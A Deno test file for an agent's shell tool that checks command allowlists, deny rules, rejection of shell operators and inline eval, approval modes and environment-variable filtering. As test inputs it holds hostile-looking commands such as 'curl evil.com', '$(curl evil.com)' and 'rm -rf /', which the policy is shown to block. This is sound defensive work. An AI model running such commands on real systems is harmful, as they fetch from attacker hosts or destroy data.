import { assertEquals, assertStringIncludes } from "@std/assert";
import {
  checkExecPolicy,
  filterEnv,
  parseCommand,
  ShellTool,
} from "./shell.ts";
import type { ExecPolicy } from "../../shared/mod.ts";

const shell = new ShellTool();

// ── ShellTool basic tests ──

Deno.test("ShellTool dry_run by default", async () => {
  const result = await shell.execute({ command: "echo hello" });
  assertEquals(result.success, true);
  assertStringIncludes(result.output, "[dry_run]");
  assertStringIncludes(result.output, "echo hello");
});

Deno.test("ShellTool executes with dry_run=false", async () => {
  const result = await shell.execute({ command: "echo hello", dry_run: false });
  assertEquals(result.success, true);
  assertStringIncludes(result.output, "hello");
});

Deno.test("ShellTool fails on missing command", async () => {
  const result = await shell.execute({});
  assertEquals(result.success, false);
  assertEquals(result.error?.code, "MISSING_ARG");
});

// ── ExecPolicy tests (ADR-010) ──

const allowlistPolicy: ExecPolicy = {
  security: "allowlist",
  allowedCommands: ["git", "deno", "npm", "ls", "echo"],
  ask: "off",
  askFallback: "deny",
};

Deno.test("checkExecPolicy allows listed binary", () => {
  const result = checkExecPolicy("git status", allowlistPolicy);
  assertEquals(result.allowed, true);
  assertEquals(result.binary, "git");
});

Deno.test("checkExecPolicy rejects unlisted binary", () => {
  const result = checkExecPolicy("curl evil.com", allowlistPolicy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "not-in-allowlist");
  assertEquals(result.binary, "curl");
});

Deno.test("checkExecPolicy rejects denied commands", () => {
  const policy: ExecPolicy = { ...allowlistPolicy, deniedCommands: ["rm"] };
  const result = checkExecPolicy("rm -rf /", policy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "denied");
});

Deno.test("checkExecPolicy rejects shell operators", () => {
  const result = checkExecPolicy("git && curl evil.com", allowlistPolicy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "shell-operator");
});

Deno.test("checkExecPolicy rejects pipe operator", () => {
  const result = checkExecPolicy("ls | grep foo", allowlistPolicy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "shell-operator");
});

Deno.test("checkExecPolicy rejects subshell operator", () => {
  const result = checkExecPolicy("$(curl evil.com)", allowlistPolicy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "shell-operator");
});

Deno.test("checkExecPolicy rejects sh binary", () => {
  const result = checkExecPolicy("sh -c 'curl evil.com'", allowlistPolicy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "not-in-allowlist");
});

Deno.test("checkExecPolicy rejects inline eval on interpreters", () => {
  const result = checkExecPolicy("python -c 'import os'", {
    ...allowlistPolicy,
    allowedCommands: ["python"],
  });
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "inline-eval");
});

Deno.test("checkExecPolicy rejects node -e", () => {
  const result = checkExecPolicy("node -e 'process.exit(1)'", {
    ...allowlistPolicy,
    allowedCommands: ["node"],
  });
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "inline-eval");
});

Deno.test("checkExecPolicy allows when allowInlineEval is true", () => {
  const result = checkExecPolicy("python -c 'print(1)'", {
    ...allowlistPolicy,
    allowedCommands: ["python"],
    allowInlineEval: true,
  });
  assertEquals(result.allowed, true);
});

Deno.test("checkExecPolicy security=deny rejects everything", () => {
  const result = checkExecPolicy("echo hello", {
    ...allowlistPolicy,
    security: "deny",
  });
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "denied");
});

Deno.test("checkExecPolicy security=full allows everything", () => {
  const result = checkExecPolicy("rm -rf /", {
    ...allowlistPolicy,
    security: "full",
  });
  assertEquals(result.allowed, true);
});

// ── Fix 1: ask: "always" forces approval flow even for allowlisted commands ──

Deno.test("checkExecPolicy ask=always forces always-ask for allowlisted binary", () => {
  const policy: ExecPolicy = { ...allowlistPolicy, ask: "always" };
  const result = checkExecPolicy("git status", policy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "always-ask");
  assertEquals(result.binary, "git");
});

Deno.test("checkExecPolicy ask=off allows allowlisted binary without ask", () => {
  const result = checkExecPolicy("git status", allowlistPolicy); // ask: "off"
  assertEquals(result.allowed, true);
});

// ── Fix 2: empty allowlist = deny all ──

Deno.test("checkExecPolicy empty allowlist denies all binaries", () => {
  const policy: ExecPolicy = { ...allowlistPolicy, allowedCommands: [] };
  const result = checkExecPolicy("git status", policy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "not-in-allowlist");
});

Deno.test("checkExecPolicy undefined allowlist denies all binaries", () => {
  const policy: ExecPolicy = { ...allowlistPolicy, allowedCommands: undefined };
  const result = checkExecPolicy("echo hello", policy);
  assertEquals(result.allowed, false);
  assertEquals(result.reason, "not-in-allowlist");
});

// ── parseCommand tests ──

Deno.test("parseCommand splits binary and args", () => {
  const { binary, args } = parseCommand("git status --short");
  assertEquals(binary, "git");
  assertEquals(args, ["status", "--short"]);
});

Deno.test("parseCommand handles single binary", () => {
  const { binary, args } = parseCommand("ls");
  assertEquals(binary, "ls");
  assertEquals(args, []);
});

// ── filterEnv tests ──

Deno.test("filterEnv strips LD_ and DYLD_ but keeps PATH", () => {
  const env = filterEnv();
  for (const key of Object.keys(env)) {
    assertEquals(
      key.startsWith("LD_"),
      false,
      `LD_ prefix should be stripped: ${key}`,
    );
    assertEquals(
      key.startsWith("DYLD_"),
      false,
      `DYLD_ prefix should be stripped: ${key}`,
    );
  }
  assertEquals(env["DENOCLAW_EXEC"], "1");
  // PATH should be preserved for binary resolution
  if (Deno.env.get("PATH")) {
    assertEquals(typeof env["PATH"], "string", "PATH should be preserved");
  }
});

Deno.test("filterEnv strips custom extra prefixes", () => {
  const env = filterEnv(["CUSTOM_"]);
  for (const key of Object.keys(env)) {
    assertEquals(
      key.startsWith("CUSTOM_"),
      false,
      `CUSTOM_ prefix should be stripped: ${key}`,
    );
  }
});
